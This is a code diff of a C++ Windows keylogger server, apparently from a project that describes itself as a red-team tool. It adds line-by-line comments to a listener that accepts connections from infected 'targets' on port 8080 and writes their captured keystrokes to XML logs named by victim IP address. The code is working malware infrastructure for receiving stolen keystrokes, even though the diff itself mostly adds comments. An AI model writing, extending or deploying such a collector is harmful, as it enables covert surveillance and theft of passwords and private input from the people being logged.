@@ -66,63 +66,145 @@ JNICALL void setConsoleColorCaptureInformationKL()
     ReleaseMutex(mu);
       return ret;
   }
+/**
+    Title: Listener
+    Description: opens a listening socket and initiate the 
+    server. continue to add connections to the global self
+    referential linked list. increment the connection count
+    
+*/
 void Listener()
 {
 
     WSADATA WSA;
+    /*
+        create the server listener socket.
+    */
     SOCKET Listener;
+    /*
+        create the sockaddrs for the server and the target
+    */
     SOCKADDR_IN server, target;
+    /*
+        initiate the head socket list item 
+    */
     head= static_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
+    /*
+        set the heads target and next target to null
+    */
     (head->nextTarget)=0x00;
     (head->target)=0x00;
+    /*  
+        declare a timestamp item for file naming
+    */
     SYSTEMTIME timestamp;
-
+    /*
+        wait for the main thread to finish priority increments
+        and other console output
+    */
     WaitForSingleObject(mu,INFINITE);
     ReleaseMutex(mu);
-
+    /*
+        integer to hold the size of the SOCKADDR_IN structure
+    */
     int cL;
+    /*
+        greeting message for the server.
+    */
     fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
     fprintf(stderr ,"\t[*] Initalizing socket...\n");
+    /*
+        attempt to start the windows socket api
+    */
     if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
     {
         fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
         return;
     }
     fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
+    /*
+        attempt to create a socket.
+    */
     if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
     {
         fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
         return;
     }
+    /*
+        set the parameters for the server connections
+    */
     server.sin_family =AF_INET;
     server.sin_addr.S_un.S_addr = INADDR_ANY;
     server.sin_port=htons(8080);
     fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
+    /*
+        bind the socket according to the parameters set by the server.
+    */
     if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
     {
         fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
         return;
     }
-
+    /*
+        this server is not designed to spy on several hundred people connecting 
+        simultaneously, instead this is designed for red team and pen-testers. though 
+        this server may handle more, a backlog of connections should not pass 3
+    */
     listen(Listener,3);
+    /*
+        set cl to the size of the target's SOCKADDR_in structure.
+    */
     cL=sizeof(target);
+    /*
+        declare a buffer to hold the name of the log file.
+    */
     char* name;
+    /*
+        listen for connections indefinitely
+    */
     while(true)
     {
+        /*
+            declare a Socket and allocate the space for the socket structure
+        */
         SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
+        /*
+            wait indefinitely for the next connection to be established
+        */
         *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
+        /*
+            declare a SOCKETLIST structure and allocate memory for the structure
+        */
         SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
+        /*
+            if the target failed then inform the end user of the failure and proceed 
+            without further processing.
+        */
         if(*acceptedTarget==INVALID_SOCKET)
         {
             fprintf(stderr ,"\n\t\t[*] error connecting");
         }
         else
         {
-
+            /*
+                an integer that holds the mode value of the socket.
+            */
             u_long mode =1;
+            /*
+                set the socket to nonblocking.
+            */
             ioctlsocket(*acceptedTarget,FIONBIO,&mode);
+            /*
+                allocate space to hold the name/
+            */
             name = static_cast<char*>(malloc(0x100));
+            /*
+                set the link name pointer to the allocated memory
+            */
             link->name = name;
+            /*
+                set this links target to the accepted target
+            */
             link->target = acceptedTarget;
             /*
                 if a file from the same ip is created at the same time then the naming convention
@@ -130,17 +212,34 @@ void Listener()
             */
             do
             {
+                /*
+                    get the current system timeto generate the xml log name.
+                */
                 GetSystemTime(&timestamp);
+                /*
+                    generate the log file name/
+                */
                 sprintf(link->name,".\\logged\\%ld_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                     timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
+                /*
+                    create the log file handle and insert it into the link.
+                */
                 link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                                FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                                FILE_ATTRIBUTE_NORMAL,NULL);
-
+            /*
+                repeat the logfile generation untill successful
+            */
             }while(link->FileDescriptor == INVALID_HANDLE_VALUE);
-
+            /*
+                set the internal file pointer in the fileDescriptor to position 0
+                within the xml document
+            */
             SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
-             WriteFile(link->FileDescriptor,
+            /*
+                write the xml header to the file
+            */
+            WriteFile(link->FileDescriptor,
                 "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                 strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);
 
@@ -151,21 +250,46 @@ void Listener()
                 socket.
             */
             link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
-
+            /*
+                we have a newly created socketlist structure that can be added
+                to the global link list, to do this safely we must register a lock 
+                to the mutex.
+            */
             WaitForSingleObject(mu,INFINITE);
+
             if((head->target)==0x00)
             {
-
+                /*
+                    if the head is null then point the 
+                    head to the link.
+                */
                 *head=*link;
+                /*
+                    self reference the head to itself.
+                */
                 head->nextTarget=head;
             }
             else
             {
+                /*
+                    if the head is not null then we must insert a 
+                    new node. set the links next target to the heads
+                    next target.
+                */
                 link->nextTarget=head->nextTarget;
+                /*
+                    point the next target of the head towards the link.
+                */
                 head->nextTarget=link;
             }
-            ReleaseMutex(mu);
+            /*
+                increment the connection count.
+            */
             ConnectionCount++;
+            /*
+                release the mutex handle. 
+            */
+            ReleaseMutex(mu);
 
         }
 
@@ -351,7 +475,8 @@ void Handler()
         }
 }
 /**
-    Title: main, initiates the java virtual machine and starts the
+    Title: main
+    Description: initiates the java virtual machine and starts the
     two threads that process connections. thread 1 controls the initial
     connections and inserts them into a self referential linked list,
     thread 2 iterates through the linked list and reads any incoming data
